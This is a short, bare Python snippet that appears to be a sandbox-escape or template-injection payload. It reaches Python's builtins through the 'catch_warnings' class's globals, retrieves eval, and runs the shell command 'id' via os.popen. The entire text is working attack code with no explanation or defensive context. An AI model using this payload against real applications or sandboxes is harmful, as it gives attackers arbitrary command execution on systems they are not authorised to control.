for c in [].__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        for b in c.__init__.__globals__.values():
            if b.__class__ == {}.__class__:
                if 'eval' in b.keys():
                    b['eval']('__import__("os").popen("id").read()')
